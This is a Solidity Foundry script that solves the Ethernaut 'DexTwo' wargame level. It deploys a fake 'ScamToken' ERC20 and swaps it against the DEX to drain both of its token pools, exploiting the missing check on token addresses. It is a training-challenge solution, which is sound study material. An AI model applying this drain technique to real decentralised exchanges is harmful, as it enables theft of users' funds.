// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {DexTwo} from "src/23/DexTwo.sol";
import {DexTwoFactory} from "src/23/DexTwoFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract DexTwoExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL23_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new DexTwoFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig{value: 0.001 ether}(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        DexTwo instanceContract = DexTwo(instance);
        ScamToken tokenToSwap = new ScamToken();
        tokenToSwap.approve(address(instanceContract), type(uint256).max);

        tokenToSwap.mint(tx.origin, 1);
        tokenToSwap.mint(address(instanceContract), 1);
        instanceContract.swap(address(tokenToSwap), instanceContract.token1(), 1);

        tokenToSwap.mint(tx.origin, 2);
        instanceContract.swap(address(tokenToSwap), instanceContract.token2(), 2);


        vm.stopPrank();

        uint256 balanceDexToken1 = instanceContract.balanceOf(instanceContract.token1(), address(instanceContract));
        uint256 balanceDexToken2 = instanceContract.balanceOf(instanceContract.token2(), address(instanceContract));

        assert(balanceDexToken1 == 0 && balanceDexToken2 == 0);

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}


contract ScamToken is ERC20 {
    address owner;

    constructor() ERC20("DEXScammer", "DEXS") {
        owner = msg.sender;
    }

    function mint(address receiver, uint256 amount) external {
        require(msg.sender == owner);

        _mint(receiver, amount);
    }
}